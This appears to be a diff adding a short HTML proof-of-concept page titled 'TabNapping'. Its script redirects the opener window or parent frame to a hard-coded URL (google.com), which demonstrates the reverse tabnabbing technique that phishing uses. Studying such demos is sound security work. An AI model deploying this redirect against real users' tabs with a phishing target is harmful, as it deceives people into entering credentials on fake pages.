@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TabNapping</title>
+  </head>
+  <body>
+    <h1 style="text-align: center">Tab napping</h1>
+    <h2 id="result"></h2>
+    <script>
+      const resultUI = document.getElementById("result");
+      const URL = "https://www.google.com";
+      if (window.opener) {
+        resultUI.innerText = "opener";
+        window.opener.parent.location.replace(URL);
+      } else if (window.parent != window) {
+        resultUI.innerText = "parent";
+        window.parent.location.replace(URL);
+      } else {
+        resultUI.innerText = "sorry";
+      }
+    </script>
+  </body>
+</html>
